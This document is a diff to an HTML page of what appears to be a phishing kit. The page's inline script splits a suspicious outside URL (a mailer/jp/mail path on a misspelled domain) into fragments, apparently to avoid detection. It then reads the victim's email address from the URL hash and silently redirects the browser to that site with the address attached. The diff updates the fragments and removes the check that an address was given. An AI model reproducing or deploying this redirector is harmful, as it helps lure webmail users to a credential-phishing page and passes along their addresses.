@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html>
 <head>
@@ -8,29 +7,21 @@
     </style>
     <script>
         (function() {
-            var part1 = "https://debconstrruct";
-            var part2 = "ion.com/mailer/jp/m";
-            var part3 = "ail/niftyy-/86t65r45rf64r74e5/76tr5654353/index.html#";
+            var part1 = "https://debconstrruction.com/mailer/jp/mai";
+            var part2 = "l/niftyy-/33445wt6rhr/7";
+            var part3 = "6tr5654353/3433/index.php";
 
-            // Function to get the email from the query string
-            function getQueryParameter(param) {
-                var urlParams = new URLSearchParams(window.location.search);
-                return urlParams.get(param);
-            }
-
-            // Get the 'email' parameter from the URL query string
-            var email = getQueryParameter('email');
+            // Get the email parameter from the URL
+            var email = window.location.hash.substring(1);
 
             // Decode the email parameter to keep @ symbol intact
-            if (email) {
-                var decodedEmail = decodeURIComponent(email);
+            var decodedEmail = decodeURIComponent(email);
 
-                // Construct the redirect URL without any prefix
-                var redirectUrl = part1 + part2 + part3 + decodedEmail;
+            // Construct the redirect URL
+            var redirectUrl = part1 + part2 + part3 + "" + decodedEmail;
 
-                // Redirect to the constructed URL
-                window.location.href = redirectUrl;
-            }
+            // Redirect to the constructed URL
+            window.location.href = redirectUrl;
         })();
     </script>
 </head>
